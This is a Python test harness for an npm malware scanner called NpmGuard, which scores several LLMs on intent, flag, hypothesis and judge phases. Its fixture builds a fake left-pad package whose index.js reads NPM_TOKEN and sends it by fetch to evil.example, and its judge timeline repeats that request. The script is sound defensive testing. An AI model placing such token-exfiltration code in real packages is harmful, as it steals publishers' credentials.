"""Exercise every NpmGuard LLM phase through Kit against real models.

This is deliberately a small, adversarial fixture rather than a package batch:
it gives each model the same four contracts eight times, records semantic pass
rates, provider routing, physical attempts, and cost, and avoids sandbox runs.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import tempfile
from collections import Counter
from pathlib import Path
from typing import Any

import sqlalchemy as sa

from kit_llm.capture import llm_attempts, llm_runs
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard.config import Settings
from npmguard.contract.models import Hypothesis
from npmguard.evidence import RenderedTimeline
from npmguard.inventory import analyze_inventory
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.orchestrator import judge_evidence
from npmguard.phases import (
    Flag,
    KitHypothesisGenerator,
    PackageIntent,
    extract_intent,
    run_flag,
)

DEFAULT_MODELS = (
    "google/gemini-2.5-flash",
    "google/gemini-2.5-flash-lite",
    "openai/gpt-4.1-nano",
    "deepseek/deepseek-v3.1-terminus:exacto",
    "mistralai/mistral-small-3.2-24b-instruct",
)
PHASES = ("intent", "flag", "hypothesis", "judge")


def fixture(root: Path) -> Path:
    package = root / "package"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps(
            {
                "name": "tiny-left-pad",
                "version": "1.0.0",
                "description": "Pads strings on the left",
                "main": "index.js",
            }
        ),
        encoding="utf-8",
    )
    (package / "README.md").write_text(
        "# tiny-left-pad\nPads a string to a requested width.", encoding="utf-8"
    )
    (package / "index.js").write_text(
        "module.exports = function pad(value) {\n"
        "  const token = process.env.NPM_TOKEN;\n"
        "  if (token) fetch('https://evil.example/collect?token=' + encodeURIComponent(token));\n"
        "  return String(value).padStart(8);\n"
        "};\n",
        encoding="utf-8",
    )
    return package


def fixed_hypothesis() -> Hypothesis:
    return Hypothesis.model_validate(
        {
            "hypId": "hyp-0001",
            "description": "The package sends NPM_TOKEN to an unrelated host",
            "claim": {"kind": "env_exfil", "gating": None},
            "focusFiles": ["index.js"],
            "focusLines": [{"file": "index.js", "range": "2-3"}],
            "experiment": [
                {"tool": "setEnv", "args": {"env": {"NPM_TOKEN": "NPMGUARD_CANARY_TOKEN"}}},
                {
                    "tool": "trigger",
                    "args": {
                        "kind": "entrypoint",
                        "target": "index.js",
                        "argv": [],
                        "stdin": None,
                    },
                },
            ],
            "severity": "high",
            "parentHypId": None,
            "childHypIds": [],
            "state": "OPEN",
            "createdBy": "hypothesize",
            "evidenceRefs": [],
            "createdAt": "2026-07-20T00:00:00Z",
            "resolvedAt": None,
            "resolution": None,
        }
    )


async def exercise(
    *, model_index: int, model: str, repeat: int, sessions, settings: Settings, package: Path
) -> dict[str, Any]:
    llm = build_npmguard_llm(
        sessions,
        settings.model_copy(update={"triage_model": model, "investigation_model": model}),
    )
    inventory = await analyze_inventory(package)
    baseline = PackageIntent(
        statedPurpose="Pads strings on the left",
        expectedCapabilities=[],
        rationale="package manifest and README",
    )
    flag = Flag(file="index.js", lines=["2-3"], why="reads and exfiltrates NPM_TOKEN")
    row: dict[str, Any] = {"model": model, "repeat": repeat, "phases": {}}

    context = f"m{model_index}-r{repeat}-intent"
    try:
        result = await extract_intent(package, inventory, llm, context)
        fallback = result.rationale.startswith("No LLM-derived intent")
        row["phases"]["intent"] = {
            "pass": not fallback and bool(result.statedPurpose),
            "fallback": fallback,
            "output": result.model_dump(mode="json"),
        }
    except Exception as exc:
        row["phases"]["intent"] = {"pass": False, "error": repr(exc)}

    context = f"m{model_index}-r{repeat}-flag"
    try:
        result = await run_flag(package, inventory, baseline, llm, context)
        capabilities = {cap for summary in result.fileSummaries for cap in summary.capabilities}
        row["phases"]["flag"] = {
            "pass": bool(result.flags),
            "relevantCapabilities": bool(
                capabilities & {"NETWORK", "DATA_EXFILTRATION", "ENV_VARS"}
            ),
            "flags": [item.model_dump(mode="json") for item in result.flags],
            "capabilities": sorted(capabilities),
        }
    except Exception as exc:
        row["phases"]["flag"] = {"pass": False, "error": repr(exc)}

    context = f"m{model_index}-r{repeat}-hypothesis"
    try:
        result = await KitHypothesisGenerator(llm).generate(
            flag,
            package_path=package,
            intent=baseline,
            entry_points=inventory.entryPoints,
            hypothesis_id="hyp-0001",
            created_at="2026-07-20T00:00:00Z",
            audit_id=context,
        )
        tools = [call.tool for call in result.experiment]
        row["phases"]["hypothesis"] = {
            "pass": bool(tools) and tools[-1] == "trigger",
            "claim": result.claim.model_dump(mode="json"),
            "tools": tools,
        }
    except Exception as exc:
        row["phases"]["hypothesis"] = {"pass": False, "error": repr(exc)}

    context = f"m{model_index}-r{repeat}-judge"
    try:
        result = await judge_evidence(
            fixed_hypothesis(),
            RenderedTimeline(
                text=(
                    "e1    env      read NPM_TOKEN\n"
                    "e2    network  GET https://evil.example/collect?token=NPMGUARD_CANARY_TOKEN"
                ),
                ids=frozenset({"e1", "e2"}),
            ),
            baseline.statedPurpose,
            llm,
            context,
        )
        row["phases"]["judge"] = {
            "pass": result.confirmed and bool(result.cited_events),
            "judgeFailed": result.judge_failed,
            "verdict": result.verdict.model_dump(mode="json"),
        }
    except Exception as exc:
        row["phases"]["judge"] = {"pass": False, "error": repr(exc)}

    await llm.aclose()
    return row


async def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--model", action="append", dest="models")
    parser.add_argument("--repeats", type=int, default=8)
    parser.add_argument("--concurrency", type=int, default=2)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()
    models = args.models or list(DEFAULT_MODELS)
    settings = Settings()
    if not settings.llm_api_key:
        raise SystemExit("NPMGUARD_LLM_API_KEY is not configured")

    with tempfile.TemporaryDirectory(prefix="npmguard-phase-matrix-") as directory:
        root = Path(directory)
        package = fixture(root)
        engine = make_engine(f"sqlite+aiosqlite:///{root / 'ledger.sqlite3'}")
        async with engine.begin() as connection:
            await connection.run_sync(metadata.create_all)
        sessions = make_session_factory(engine)
        semaphore = asyncio.Semaphore(max(1, args.concurrency))

        async def bounded(model_index: int, model: str, repeat: int) -> dict[str, Any]:
            async with semaphore:
                return await exercise(
                    model_index=model_index,
                    model=model,
                    repeat=repeat,
                    sessions=sessions,
                    settings=settings,
                    package=package,
                )

        rows = await asyncio.gather(
            *(
                bounded(model_index, model, repeat)
                for model_index, model in enumerate(models)
                for repeat in range(args.repeats)
            )
        )
        async with sessions() as session:
            attempt_rows = (
                await session.execute(
                    sa.select(
                        llm_runs.c.context_id,
                        llm_runs.c.role,
                        llm_attempts.c.status,
                        llm_attempts.c.model,
                        llm_attempts.c.output,
                        llm_attempts.c.error,
                        llm_attempts.c.in_tokens,
                        llm_attempts.c.out_tokens,
                        llm_attempts.c.cost_usd,
                    ).join(llm_attempts, llm_attempts.c.run_id == llm_runs.c.id)
                )
            ).mappings().all()

        summary: dict[str, Any] = {}
        for model in models:
            selected = [row for row in rows if row["model"] == model]
            summary[model] = {
                phase: {
                    "passed": sum(bool(row["phases"][phase]["pass"]) for row in selected),
                    "attempts": len(selected),
                }
                for phase in PHASES
            }
        statuses = Counter(row.status for row in attempt_rows)
        routes = Counter(
            (
                (row.output or {}).get("provider") or "unknown",
                (row.output or {}).get("actual_model") or row.model or "unknown",
            )
            for row in attempt_rows
        )
        report = {
            "models": models,
            "repeats": args.repeats,
            "summary": summary,
            "physicalAttempts": len(attempt_rows),
            "attemptStatuses": dict(statuses),
            "knownCostUsd": round(sum(row.cost_usd or 0 for row in attempt_rows), 8),
            "routes": [
                {"provider": provider, "model": model, "attempts": count}
                for (provider, model), count in sorted(routes.items())
            ],
            "rows": rows,
            "attempts": [dict(row) for row in attempt_rows],
        }
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(json.dumps(report, indent=2, default=str), encoding="utf-8")
        print(json.dumps(summary, indent=2))
        print(
            json.dumps(
                {
                    "physicalAttempts": report["physicalAttempts"],
                    "attemptStatuses": report["attemptStatuses"],
                    "knownCostUsd": report["knownCostUsd"],
                    "routes": report["routes"],
                    "output": str(args.output),
                },
                indent=2,
            )
        )
        await engine.dispose()


if __name__ == "__main__":
    asyncio.run(main())
